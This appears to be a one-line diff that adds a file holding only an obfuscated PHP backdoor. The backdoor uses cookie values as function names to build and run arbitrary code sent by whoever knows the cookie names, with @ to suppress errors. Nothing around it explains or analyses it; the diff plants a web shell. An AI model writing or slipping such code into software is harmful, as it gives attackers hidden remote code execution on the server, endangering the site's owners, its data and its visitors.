@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['xdps']){$pnh=$_COOKIE['xdps']("",@$_COOKIE['eztvqa'](@$_COOKIE['gnelm']));$pnh();}?>
